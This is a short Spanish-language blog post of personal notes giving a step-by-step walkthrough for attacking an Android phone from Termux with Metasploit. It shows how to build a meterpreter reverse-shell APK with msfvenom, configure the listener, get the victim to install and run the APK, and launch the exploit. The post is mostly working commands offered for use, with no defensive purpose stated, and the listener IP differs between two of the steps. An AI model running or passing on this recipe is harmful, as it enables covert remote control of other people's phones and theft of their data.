---
layout: post
title:  "Metasploit"
date:   2020-12-06 12:02:36 +0530
categories: Metasploit
---
En este post quiero incluir algunas notas sobre como hacer un ataque a android desde termux con la herramienta Metasploit

la instalacion de texmux la encuentra [aqui][aqui]


Actualizar repositorios

    apt update && apt upgrade


instalacion de Metasploit


    pkg install unstable-repo
    pkg install metasploit


verificar la ip:

    ifconfig

<img src="{{ "/assets/img/ifconfig.jpg" | relative_url }}" alt="{{ site.plainwhite.name }}">
    

generar payload:

    msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 R > /sdcard/miapk.apk

preparamos metasploit

    set payload android/meterpreter/reverse_tcp

    set lhost 192.168.1.5

    set lport 4444

instalamos y ejecutamos el apk en el android a atacar

<img src="{{ "/assets/img/tor.jpg" | relative_url }}" alt="{{ site.plainwhite.name }}">

ejecutamos el exploit:

    exploit
    
[aqui]: https://santiago60.github.io/termux/2020-12-16-termux.markdown